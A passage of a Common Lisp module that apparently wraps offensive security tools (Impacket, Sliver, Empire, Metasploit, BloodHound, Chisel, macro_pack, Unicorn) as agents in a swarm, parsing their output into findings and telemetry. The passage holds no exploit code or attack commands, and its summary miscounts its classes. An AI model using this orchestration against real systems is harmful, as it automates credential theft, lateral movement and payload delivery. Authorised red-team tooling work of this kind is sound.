    (when (cl-ppcre:scan "(SMBConnection|Authenticating| Executing )" line)
      (push `(:type :smbexec-activity
              :tool :smbexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-atexec-agent) line)
  "Parse atexec output for Task Scheduler execution results."
  (let ((findings '()))
    (when (cl-ppcre:scan "(Adding task|Task executed|Deleting task)" line)
      (push `(:type :atexec-activity
              :tool :atexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-dcomexec-agent) line)
  "Parse dcomexec output for DCOM execution results.

Detects:
  • DCOM object activation
  • Shell command execution via MMC20 or other objects
  • Output retrieval status"
  (let ((findings '()))
    (when (cl-ppcre:scan "(DCOM Object|ExecuteShellCommand|MMC20)" line)
      (push `(:type :dcomexec-activity
              :tool :dcomexec
              :target ,(impacket-target agent)
              :dcom-object ,(impacket-dcom-object agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-samrdump-agent) line)
  "Parse samrdump output for user/group enumeration results.

Detects:
  • User account entries
  • Group memberships
  • Account policies
  • Domain trusts"
  (let ((findings '()))
    ;; User entry:  rid:username:fullname:description
    (when (cl-ppcre:scan "^\\s*\\d+:\\s*\\w+" line)
      (cl-ppcre:register-groups-bind (rid username)
          ("^\\s*(\\d+):\\s*(\\w+)" line)
        (push `(:type :samr-user-enumerated
                :tool :samrdump
                :target ,(impacket-target agent)
                :rid ,rid
                :username ,username
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; Group entry: GroupName:Member1,Member2,...
    (when (cl-ppcre:scan "Group:\\s*\\w+" line)
      (cl-ppcre:register-groups-bind (group-name)
          ("Group:\\s*(\\w+)" line)
        (push `(:type :samr-group-enumerated
                :tool :samrdump
                :target ,(impacket-target agent)
                :group ,group-name
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; Password policy
    (when (cl-ppcre:scan "(MinPasswordLength|PasswordHistory)" line)
      (push `(:type :password-policy-discovered
              :tool :samrdump
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-mqttexec-agent) line)
  "Parse mqttexec output for IoT command execution results."
  (let ((findings '()))
    (when (cl-ppcre:scan "(MQTT|Published|Subscribed|Executing)" line)
      (push `(:type :mqttexec-activity
              :tool :mqttexec
              :target ,(impacket-target agent)
              :topic ,(impacket-topic agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.9.2  C2 Framework Agent Findings Parsers
;; ───────────────────────────────────────────────────────────────────────────

(defmethod parse-findings :after ((agent sliver-agent) line)
  "Parse Sliver C2 output for session and implant status.

Detects:
  • Session check-in events
  • Task completion status
  • Implant errors or disconnections
  • Operator command output"
  (let ((findings '()))
    ;; Session check-in
    (when (cl-ppcre:scan "(Session .* checked in|Beacon from)" line)
      (push `(:type :sliver-session-checkin
              :tool :sliver
              :implant ,(sliver-implant-name agent)
              :operator ,(sliver-operator agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Task completed
    (when (cl-ppcre:scan "(Task completed|Executed)" line)
      (push `(:type :sliver-task-completed
              :tool :sliver
              :implant ,(sliver-implant-name agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Implant error
    (when (cl-ppcre:scan "(Error|Failed|dead implant)" line)
      (push `(:type :sliver-implant-error
              :tool :sliver
              :implant ,(sliver-implant-name agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent havoc-agent) line)
  "Parse Havoc C2 output for demon/agent status and tasks."
  (let ((findings '()))
    (when (cl-ppcre:scan "(Demon checked in|Agent .* online|Task)" line)
      (push `(:type :havoc-demon-activity
              :tool :havoc
              :listener ,(havoc-listener agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent empire-agent) line)
  "Parse Empire C2 output for agent check-in and module results."
  (let ((findings '()))
    ;; New agent check-in
    (when (cl-ppcre:scan "(New agent .* checked in|Agent .* initial)" line)
      (push `(:type :empire-agent-checkin
              :tool :empire
              :listener ,(empire-listener agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Module execution result
    (when (cl-ppcre:scan "(Module executed|Task .* completed)" line)
      (push `(:type :empire-task-completed
              :tool :empire
              :listener ,(empire-listener agent)
              :module ,(empire-module agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent covenant-agent) line)
  "Parse Covenant C2 output for grunt session events."
  (let ((findings '()))
    (when (cl-ppcre:scan "(Grunt .* checked in|Task .* completed|Error)" line)
      (push `(:type :covenant-grunt-activity
              :tool :covenant
              :grunt ,(covenant-grunt-name agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent poshc2-agent) line)
  "Parse PoshC2 output for implant check-in and task results."
  (let ((findings '()))
    (when (cl-ppcre:scan "(Implant .* checked in|New implant|Task)" line)
      (push `(:type :poshc2-implant-activity
              :tool :poshc2
              :server ,(poshc2-server-addr agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent mythic-agent) line)
  "Parse Mythic C2 output for callback and task events."
  (let ((findings '()))
    (when (cl-ppcre:scan "(Callback .* checked in|Task .* completed|Error)" line)
      (push `(:type :mythic-callback-activity
              :tool :mythic
              :callback ,(mythic-callback-name agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent metasploit-enhanced-agent) line)
  "Parse Metasploit output for exploit results and session events.

Detects:
  • Successful exploitation (session opened)
  • Meterpreter session initialization
  • Route/pivot establishment
  • Exploit failure indicators"
  (let ((findings '()))
    ;; Session opened
    (when (cl-ppcre:scan "(Meterpreter session |session .* opened|Command shell session)" line)
      (cl-ppcre:register-groups-bind (session-num)
          ("session (\\d+) opened" line)
        (push `(:type :metasploit-session-opened
                :tool :metasploit
                :exploit ,(msf-exploit agent)
                :target ,(msf-target agent)
                :session-id ,(or session-num "unknown")
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; Exploit completed but no session
    (when (cl-ppcre:scan "(Exploit completed, but no session|Exploit failed)" line)
      (push `(:type :metasploit-exploit-failed
              :tool :metasploit
              :exploit ,(msf-exploit agent)
              :target ,(msf-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Route added
    (when (cl-ppcre:scan "Route added" line)
      (push `(:type :metasploit-route-added
              :tool :metasploit
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.9.3  AD Recon Agent Findings Parsers
;; ───────────────────────────────────────────────────────────────────────────

(defmethod parse-findings :after ((agent bloodhound-python-agent) line)
  "Parse BloodHound Python output for collection progress and results.

Detects:
  • Collection progress indicators
  • Objects enumerated (users, groups, computers)
  • Collection completion
  • ACL/ACE enumeration results
  • Trust relationship discovery"
  (let ((findings '()))
    ;; Collection progress
    (when (cl-ppcre:scan "(Collecting|Querying|Resolved)" line)
      (push `(:type :bloodhound-collection-progress
              :tool :bloodhound-python
              :domain ,(bh-domain agent)
              :method ,(bh-collection-method agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Objects found
    (when (cl-ppcre:scan "(Found \\d+|Done in \\d+)" line)
      (push `(:type :bloodhound-objects-found
              :tool :bloodhound-python
              :domain ,(bh-domain agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Collection complete
    (when (cl-ppcre:scan "(Done|Completed|Writing)" line)
      (push `(:type :bloodhound-collection-complete
              :tool :bloodhound-python
              :domain ,(bh-domain agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent sharphound-agent) line)
  "Parse SharpHound output for collection progress and completion.

Detects:
  • Collection method progress
  • Enumeration counts
  • ZIP file creation
  • Stealth mode indicators"
  (let ((findings '()))
    ;; Enumeration count
    (when (cl-ppcre:scan "(Enumerating|Found \\d+|Completed \\w+)" line)
      (push `(:type :sharphound-enumeration-progress
              :tool :sharphound
              :domain ,(bh-domain agent)
              :method ,(bh-collection-method agent)
              :stealth ,(bh-stealth agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; ZIP output
    (when (cl-ppcre:scan "(Saved ZIP|Data saved)" line)
      (push `(:type :sharphound-output-saved
              :tool :sharphound
              :domain ,(bh-domain agent)
              :output ,(bh-zip-filename agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.9.4  Tunneling Agent Findings Parsers
;; ───────────────────────────────────────────────────────────────────────────

(defmethod parse-findings :after ((agent chisel-agent) line)
  "Parse Chisel output for tunnel connection and forwarding events.

Detects:
  • Client connection/disconnection
  • Port forwarding established
  • SOCKS5 proxy activation
  • Reverse tunnel connections
  • Authentication events"
  (let ((findings '()))
    ;; Client connected
    (when (cl-ppcre:scan "(client connected|tunnel connected)" line)
      (push `(:type :chisel-client-connected
              :tool :chisel
              :mode ,(chisel-mode agent)
              :listen ,(chisel-listen agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Port forward
    (when (cl-ppcre:scan "(forward|proxy)" line)
      (push `(:type :chisel-forward-active
              :tool :chisel
              :mode ,(chisel-mode agent)
              :remote ,(chisel-remote agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Authentication
    (when (cl-ppcre:scan "(Authentication|Invalid|authenticated)" line)
      (push `(:type :chisel-auth-event
              :tool :chisel
              :mode ,(chisel-mode agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent ligolo-ng-agent) line)
  "Parse Ligolo-ng output for TUN interface and agent events.

Detects:
  • Agent connection/disconnection
  • TUN interface creation
  • Tunnel establishment
  • SOCKS5 proxy activation
  • Network routing events"
  (let ((findings '()))
    ;; Agent connected
    (when (cl-ppcre:scan "(Agent connected|tunnel established| joined)" line)
      (push `(:type :ligolo-agent-connected
              :tool :ligolo-ng
              :mode ,(ligolo-mode agent)
              :listen ,(ligolo-listen agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; TUN interface
    (when (cl-ppcre:scan "(tun|interface|TUN)" line)
      (push `(:type :ligolo-tun-active
              :tool :ligolo-ng
              :interface ,(ligolo-tun-interface agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.9.5  Payload Generation Agent Findings Parsers
;; ───────────────────────────────────────────────────────────────────────────

(defmethod parse-findings :after ((agent macro-pack-agent) line)
  "Parse macro_pack output for payload generation results.

Detects:
  • Document generation confirmation
  • Obfuscation application
  • Payload injection status
  • Output file path"
  (let ((findings '()))
    ;; Document generated
    (when (cl-ppcre:scan "(Generated|Created|Document)" line)
      (push `(:type :macro-pack-generated
              :tool :macro-pack
              :payload-type ,(mp-payload-type agent)
              :output ,(mp-output agent)
              :obfuscated ,(mp-obfuscate agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent unicorn-agent) line)
  "Parse Unicorn output for payload generation results.

Detects:
  • PowerShell payload generation
  • Downgrade attack inclusion
  • Output file save confirmation
  • Payload delivery instructions"
  (let ((findings '()))
    ;; Payload generated
    (when (cl-ppcre:scan "(PowerShell attack|Powershell command|generated)" line)
      (push `(:type :unicorn-payload-generated
              :tool :unicorn
              :payload-type ,(uni-payload agent)
              :ip ,(uni-ip agent)
              :port ,(uni-port agent)
              :downgrade ,(uni-downgrade agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; AMSI bypass notice
    (when (cl-ppcre:scan "(AMSI|bypass|ETW)" line)
      (push `(:type :unicorn-amsi-bypass
              :tool :unicorn
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.10: Telemetry Integration — Offensive Subsystem Events
;; ═══════════════════════════════════════════════════════════════════════════

(defun record-offensive-event (event-type &rest kwargs)
  "Record a telemetry event for the offensive subsystem.

EVENT-TYPE — Keyword describing the event (:impacket-executed,
             :c2-session-opened, :tunnel-established, etc.).
KWARGS     — Plist of additional event data.

Publishes to the appropriate gossip topic based on event type."
  (let ((topic (case event-type
                 ((:impacket-executed :impacket-credential-found
                   :impacket-lateral-movement)
                  :swarm.kali.impacket)
                 ((:c2-session-opened :c2-task-completed
                   :c2-implant-checkin)
                  :swarm.kali.c2)
                 ((:ad-recon-started :bloodhound-collection-complete
                   :attack-path-discovered)
                  :swarm.kali.ad-recon)
                 ((:tunnel-established :tunnel-disconnected
                   :pivot-active)
                  :swarm.kali.tunnel)
                 ((:payload-generated :payload-delivered)
                  :swarm.kali.payload-gen)
                 (otherwise :swarm.kali.status))))
    (publish-message topic
                     `(:event-type ,event-type
                       ,@kwargs
                       :timestamp ,(local-time:now)))
    (apply #'record-telemetry-event event-type kwargs)))


;; ═══════════════════════════════════════════════════════════════════════════
;; OFFENSIVE FRAMEWORK AGENTS — Module Export Summary
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; This section provides a complete summary of all classes, constructors,
;; methods, and REPL commands defined in the Offensive Framework module.
;;
;; CLASSES (25 new):
;;   Impacket Suite (8):
;;     impacket-psexec-agent      -- SMB service-based command execution
;;     impacket-wmiexec-agent     -- WMI-based stealth execution
;;     impacket-secretsdump-agent -- NTDS/SAM/LSA credential extraction
;;     impacket-smbexec-agent     -- SMB named pipe execution
;;     impacket-atexec-agent      -- Task Scheduler execution
;;     impacket-dcomexec-agent    -- DCOM (MMC20/Shell) execution
;;     impacket-samrdump-agent    -- SAMR user/group enumeration
;;     impacket-mqttexec-agent    -- MQTT IoT command execution
;;
;;   C2 Frameworks (7):
;;     sliver-agent               -- Sliver C2 (Bishop Fox)
;;     havoc-agent                -- Havoc C2 (malleable profiles)
;;     empire-agent               -- PowerShell Empire
;;     covenant-agent             -- Covenant C2 (.NET/Grunt)
;;     poshc2-agent               -- PoshC2 (UK NCSC)
;;     mythic-agent               -- Mythic C2 (Docker agents)
;;     metasploit-enhanced-agent  -- Enhanced Metasploit (session mgmt)
;;
;;   AD Recon (2):
;;     bloodhound-python-agent    -- Python BloodHound ingestor
;;     sharphound-agent           -- C# SharpHound ingestor
;;
;;   Tunneling/Pivot (2):
;;     chisel-agent               -- HTTP/WebSocket TCP tunnel
;;     ligolo-ng-agent            -- TUN interface advanced tunnel
;;
;;   Payload Generation (2):
;;     macro-pack-agent           -- MS Office document payloads
;;     unicorn-agent              -- PowerShell downgrade payloads
;;
;; CONSTRUCTORS (25 new):
;;   make-impacket-psexec-agent, make-impacket-wmiexec-agent,
;;   make-impacket-secretsdump-agent, make-impacket-smbexec-agent,
;;   make-impacket-atexec-agent, make-impacket-dcomexec-agent,
;;   make-impacket-samrdump-agent, make-impacket-mqttexec-agent,
;;   make-sliver-agent, make-havoc-agent, make-empire-agent,
;;   make-covenant-agent, make-poshc2-agent, make-mythic-agent,
;;   make-metasploit-enhanced-agent,
;;   make-bloodhound-python-agent, make-sharphound-agent,
;;   make-chisel-agent, make-ligolo-ng-agent,
;;   make-macro-pack-agent, make-unicorn-agent
;;
;; REGISTRY MANAGEMENT (12):
;;   *impacket-agent-registry*, *c2-agent-registry*,
;;   *ad-recon-agent-registry*, *tunnel-agent-registry*,
;;   *payload-gen-agent-registry*
;;   *offensive-registry-lock*, *offensive-gossip-topics*
;;   lookup-impacket-agent, lookup-c2-agent, lookup-ad-recon-agent,
;;   lookup-tunnel-agent, lookup-payload-gen-agent
;;
;; LISTING FUNCTIONS (7):
;;   list-impacket-agents, list-c2-agents, list-ad-recon-agents,
;;   list-tunnel-agents, list-payload-gen-agents,
;;   list-all-offensive-agents, count-offensive-agents,
;;   offensive-subsystem-status
;;
;; REPL COMMANDS (6):
;;   spawn-impacket-suite, spawn-c2, spawn-tunnel,
;;   spawn-payload-gen, spawn-ad-recon, halt-all-offensive-agents
;;
;; PARSE-FINDINGS METHODS (25 new :AFTER methods):
;;   All agent subclasses have specialized output parsers that extract
;;   structured findings (credentials, sessions, tunnels, payloads)
;;   and broadcast them to appropriate gossip topics.
;;
;; TELEMETRY:
;;   record-offensive-event — Unified telemetry for all offensive events
;;
;; SPECIAL VARIABLES:
;;   *impacket-default-timeout* (300s)
;;   *c2-default-timeout* (86400s = 24h)
;;
;; ═══════════════════════════════════════════════════════════════════════════
;;              END OF OFFENSIVE FRAMEWORK AGENTS MODULE v2.3.1
;;                    END OF KALI-INTERFACE.LISP
;; ═══════════════════════════════════════════════════════════════════════════
